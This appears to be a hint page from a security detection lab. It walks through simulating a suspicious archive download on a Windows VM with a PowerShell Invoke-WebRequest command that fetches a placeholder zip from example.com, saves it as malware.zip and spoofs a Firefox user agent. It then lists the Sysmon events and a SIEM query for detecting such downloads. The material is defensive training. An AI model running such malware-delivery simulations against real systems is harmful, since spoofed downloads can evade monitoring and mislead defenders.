# Hint 1: Suspicious Archive Downloads

## Scenario Overview

Simulates the download of potentially malicious archive files (e.g., .zip, .rar) from the internet, which may be used to deliver malware.

## Simulation Steps

**On Windows VM:**
```powershell
Invoke-WebRequest -Uri "http://example.com/suspicious.zip" -OutFile "$env:USERPROFILE\Downloads\malware.zip" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
```

## Detection Guidance

- **Key Logs/Events:**
  - Winlogbeat: HTTP requests with `.zip`/`.rar`
  - Sysmon Event ID 11: FileCreate
- **SIEM Query Example:** `event.dataset:"http" AND url.path:"*.zip"`
- **What to Look For:** Unusual downloads, especially archives, from suspicious domains or with nonstandard user agents.

## Example Log Artifacts

(Paste actual log lines or reference screenshots here if available.)

## Additional Notes

Check for downloads outside of normal business processes, and correlate with threat intel on downloaded file hashes or domains.
